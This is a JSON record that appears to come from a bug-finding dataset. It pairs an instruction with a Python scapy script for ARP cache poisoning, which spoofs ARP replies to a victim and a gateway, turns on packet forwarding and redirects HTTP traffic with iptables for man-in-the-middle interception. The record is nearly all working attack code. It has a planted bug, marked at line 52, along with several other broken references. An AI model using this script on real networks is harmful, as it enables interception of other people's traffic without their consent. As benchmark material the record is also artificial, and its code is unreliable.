{
  "instruction": "This code performs an ARP cache poisoning attack. To use it, run the script and pass in the IP address of the victim, the IP address of the gateway, and the network interface to use. The script will then enable packet forwarding, redirect HTTP traffic to port 10000, and begin poisoning the victim's ARP cache. To stop the attack, press Ctrl+C. After the attack is stopped, the script will restore the victim and gateway's ARP cache to its correct state, and disable HTTP redirection and packet forwarding.",
  "buggy_code": "from scapy.all import *\nfrom argparse import ArgumentParser\n\nimport os\n\nIP_FORWARD = '/proc/sys/net/ipv4/ip_forward'\nTIMEOUT = 2\nRETRY = 10\n\ndef set_configs():\n\n    parser = ArgumentParser()\n\n    parser.add_argument('-t',\n                    dest='victim',\n                    required=True,\n                    type=str,\n                    help='The victim\\'s IP address')\n\n    parser.add_argument('-g',\n                    dest='gateway',\n                    required=True,\n                    type=str,\n                    help='The gateway\\'s IP address')\n\n    parser.add_argument('-i',\n                    dest='interface',\n                    required=True,\n                    type=str,\n                    help='Use this network interface')\n\n    args = parser.parse_args()\n\n    return {\n\n        'victim' :  {\n\n            'ip' : args.victim,\n            'mac' : ip_to_mac(args.victim),\n        },\n\n        'gateway' :  {\n            'ip' : args.gateway,\n            'mac' : ip_to_mac(args.gateway),\n        },\n\n        'iface' : args.interface,\n    }\n\ndef enable_packet_forwarding():\n\n    return\n    with open(IP_FORWARD, 'w') as fd:\n        fd.write('1')\n\ndef disable_packet_forwarding():\n\n    with open(IP_FORWARD, 'w') as fd:\n        fd.write('0')\n\ndef enable_http_redirection():\n\n    print '[*] Redirecting all http traffic to port 10000'\n\n    os.system('iptables -v -t nat  -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')\n\ndef disable_http_redirection():\n\n    print '[*] Disabling http redirection'\n\n    os.system('iptables -v --flush')\n    os.system('iptables -v --table nat --flush')\n    os.system('iptables -v --delete-chain')\n    os.system('iptables -v --table nat --delete-chain')\n\n\ndef poison_victim(configs):\n\n    victim_mac = configs['victim_mac']\n    gateway_mac = configs['gateway_mac']\n\n    victim_ip = configs['victim_ip']\n    gateway_ip = configs['gateway_ip']\n\n    victim_arp = ARP()\n    gateway_arp = ARP()\n\n    victim_arp.op = 2\n    gateway_arp.op = 2\n\n    victim_arp.hwdst = victim_mac\n    gateway_arp.hwdst = gateway_mac\n\n    victim_arp.pdst = victim_ip\n    gateway_arp.pdst = gateway_ip\n\n    victim_arp.psrc = gateway_ip\n    gateway_arp.psrc = victim_ip\n\n    while True:\n\n        try:\n\n            print '[*] Poisoning victim'\n\n            send(victim_arp)\n            send(gateway_arp)\n\n            sniff(filter='arp and host %s or %s' %\\\n                        (gateway_ip, victim_ip), count=1)\n\n\n        except KeyboardInterrupt:\n            break\n\n    print '[*] All done!'\n\ndef restore_victim(configs):\n\n    victim_mac = configs['victim_mac']\n    gateway_mac = configs['gateway_mac']\n\n    victim_ip = configs['victim_ip']\n    gateway_ip = configs['gateway_ip']\n\n    victim_arp = ARP()\n\n    victim_arp.hwsrc = gateway_mac\n    victim_arp.psrc = gateway_ip\n\n    gateway_arp.op = 2\n    gateway_arp.hwdst = 'ff:ff:ff:ff:ff:ff'\n    send(gateway_arp)\n\n    gateway_arp = ARP()\n\n    gateway_arp.hwsrc = victim_mac\n    gateway_arp.psrc = victim_ip\n\n    gateway_arp.op = 2\n    gateway_arp.hwdst = 'ff:ff:ff:ff:ff:ff'\n    send(gateway_arp)\n\ndef ip_to_mac(ip, retry=RETRY, timeout=TIMEOUT):\n\n    arp = ARP()\n\n    arp.op = 1\n\n    arp.hwdst = 'ff:ff:ff:ff:ff:ff'\n    arp.pdst = ip\n\n    response, unanswered = sr(arp, retry=retry, timeout=timeout)\n\n    for s,r in response:\n        return r[ARP].underlayer.src\n\n    return None\n\ndef poison(configs):\n\n    enable_packet_forwarding()\n    enable_http_redirection()\n\ndef antidote(configs):\n\n    disable_http_redirection()\n    disable_packet_forwarding()\n\ndef main():\n\n    configs = set_configs()\n\n    print '[*] Using interface', configs['iface']\n    conf.iface = configs['iface']\n\n    try:\n        poison(configs)\n    except KeyboardInterrupt:\n        pass\n\n    antidote(configs)\n\nif __name__ == '__main__':\n    main()\n",
  "line_no": 52,
  "line_no_percent": "28%"
}